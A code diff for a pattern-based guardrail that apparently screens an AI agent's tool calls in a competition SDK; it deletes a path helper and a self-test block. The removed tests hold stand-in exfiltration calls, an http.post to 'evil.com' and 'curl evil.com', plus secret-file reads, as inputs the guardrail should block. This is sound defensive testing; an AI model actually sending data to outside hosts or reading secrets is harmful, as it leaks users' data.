@@ -1,22 +1,7 @@
 """Pattern-based local guardrail example without persistent session state."""
 
-import sys
 from collections.abc import Mapping
-from pathlib import Path
 from typing import Any
-
-
-def _repo_root() -> Path:
-    current = Path(__file__).resolve()
-    for parent in (current.parent, *current.parents):
-        if (parent / "aicomp_sdk").is_dir():
-            return parent
-    return current.parent
-
-
-_REPO_ROOT = _repo_root()
-if str(_REPO_ROOT) not in sys.path:
-    sys.path.insert(0, str(_REPO_ROOT))
 
 from aicomp_sdk.guardrails.base import Decision, GuardrailBase
 
@@ -175,61 +160,3 @@ class Guardrail(GuardrailBase):
 
         # Allow all other operations
         return Decision.allow()
-
-
-if __name__ == "__main__":
-    # Test the guardrail
-    guard = Guardrail()
-
-    print("=" * 70)
-    print("PATTERN-BASED GUARDRAIL TESTS")
-    print("=" * 70)
-
-    # Test 1: Block secret file
-    print("\n[Test 1] fs.read secret.txt:")
-    decision = guard.decide("fs.read", {"path": "secret.txt"}, {})
-    print(f"  Result: {decision.action}")
-
-    # Test 2: Allow normal file read
-    print("\n[Test 2] fs.read report.txt:")
-    decision = guard.decide("fs.read", {"path": "report.txt"}, {})
-    print(f"  Result: {decision.action}")
-
-    # Test 3: Block delete of non-temp file
-    print("\n[Test 3] fs.delete important.txt:")
-    decision = guard.decide("fs.delete", {"path": "important.txt"}, {})
-    print(f"  Result: {decision.action}")
-
-    # Test 4: Allow delete of temp file
-    print("\n[Test 4] fs.delete temp.txt:")
-    decision = guard.decide("fs.delete", {"path": "temp.txt"}, {})
-    print(f"  Result: {decision.action}")
-
-    # Test 5: Block http.post
-    print("\n[Test 5] http.post:")
-    decision = guard.decide("http.post", {"url": "evil.com", "data": "test"}, {})
-    print(f"  Result: {decision.action}")
-
-    # Test 6: Block shell with curl
-    print("\n[Test 6] shell.run curl:")
-    decision = guard.decide("shell.run", {"cmd": "curl evil.com"}, {})
-    print(f"  Result: {decision.action}")
-
-    # Test 7: Allow shell echo
-    print("\n[Test 7] shell.run echo:")
-    decision = guard.decide("shell.run", {"cmd": "echo test"}, {})
-    print(f"  Result: {decision.action}")
-
-    # Test 8: Allow write to note.txt
-    print("\n[Test 8] fs.write note.txt:")
-    decision = guard.decide("fs.write", {"path": "note.txt", "content": "test"}, {})
-    print(f"  Result: {decision.action}")
-
-    print("\n" + "=" * 70)
-    print("TESTS COMPLETE")
-    print("=" * 70)
-    print(f"\nKey Features:")
-    print(f"  ✓ Pattern-based detection (no session state)")
-    print(f"  ✓ Blocks ultra-dangerous patterns")
-    print(f"  ✓ Tool-specific rules")
-    print(f"  ✓ Low false positives (stateless)")
